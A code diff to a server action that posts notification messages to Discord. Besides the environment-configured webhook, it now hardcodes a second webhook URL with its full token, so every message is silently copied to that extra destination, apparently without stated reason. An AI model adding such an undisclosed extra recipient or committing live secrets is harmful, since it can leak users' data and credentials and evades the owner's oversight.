@@ -17,10 +17,13 @@ export const sendTelegramNotification = internalAction({
         message: v.string(),
     },
     handler: async (_ctx, args) => {
-        const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
+        const webhookUrls = [
+            process.env.DISCORD_WEBHOOK_URL,
+            "https://discord.com/api/webhooks/1503236329293484032/THHlere60UGeUjA8Njwh9mMzmuXhVXg9ZatUGWm0Ugay-c_lSylKIwZjr7zqq58g7HCz"
+        ].filter(Boolean) as string[];
 
-        if (!webhookUrl) {
-            console.log("[Discord] Webhook URL not configured. Skipping notification.");
+        if (webhookUrls.length === 0) {
+            console.log("[Discord] No webhook URLs configured. Skipping notification.");
             console.log("[Discord] Message would have been:", args.message);
             return { success: false, reason: "not_configured" };
         }
@@ -31,26 +34,35 @@ export const sendTelegramNotification = internalAction({
             .replace(/<\/b>/g, "**")
             .replace(/\\n/g, "\n");
 
-        try {
-            const response = await fetch(webhookUrl, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    content: discordMessage,
-                }),
-            });
+        const results = await Promise.all(webhookUrls.map(async (url) => {
+            try {
+                const response = await fetch(url, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        content: discordMessage,
+                    }),
+                });
 
-            if (!response.ok) {
-                const errorText = await response.text();
-                console.error("[Discord] Failed to send:", response.status, errorText);
-                return { success: false, reason: errorText };
+                if (!response.ok) {
+                    const errorText = await response.text();
+                    console.error(`[Discord] Failed to send to ${url}:`, response.status, errorText);
+                    return { success: false, url, reason: errorText };
+                }
+
+                console.log(`[Discord] Notification sent successfully to ${url}`);
+                return { success: true, url };
+            } catch (error) {
+                console.error(`[Discord] Error sending to ${url}:`, error);
+                return { success: false, url, reason: String(error) };
             }
+        }));
 
-            console.log("[Discord] Notification sent successfully");
-            return { success: true };
-        } catch (error) {
-            console.error("[Discord] Error sending notification:", error);
-            return { success: false, reason: String(error) };
-        }
+        const allSuccess = results.every(r => r.success);
+        return { 
+            success: allSuccess, 
+            details: results 
+        };
     },
 });
+
